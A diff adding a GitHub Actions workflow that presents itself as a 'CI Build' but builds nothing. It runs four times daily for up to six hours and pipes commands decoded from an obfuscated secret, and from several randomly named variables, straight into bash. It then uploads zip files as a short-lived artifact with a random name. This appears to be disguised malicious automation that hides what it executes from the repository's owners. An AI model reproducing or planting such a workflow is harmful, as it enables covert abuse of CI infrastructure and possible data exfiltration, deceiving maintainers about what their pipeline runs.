@@ -1,0 +1,32 @@
+name: CI Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '16 0,6,12,18 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  handler:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          ututm4: ${{ secrets.ututm4 }}
+        run: |
+          printf '%s' "$ututm4" | jq -r .m4442 | /bin/bash
+          echo $of85426 | jq -r .xt330 | /bin/bash
+          echo $ow5 | jq -r .mxne86 | /bin/bash
+          printf '%s' "$fky98465" | jq -r .n6 | /bin/bash
+          echo $env8 | jq -r .qghqs59386 | /bin/bash
+
+      - name: Persist output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: sL7LN4mV
+          path: "*.zip"
+          retention-days: 1
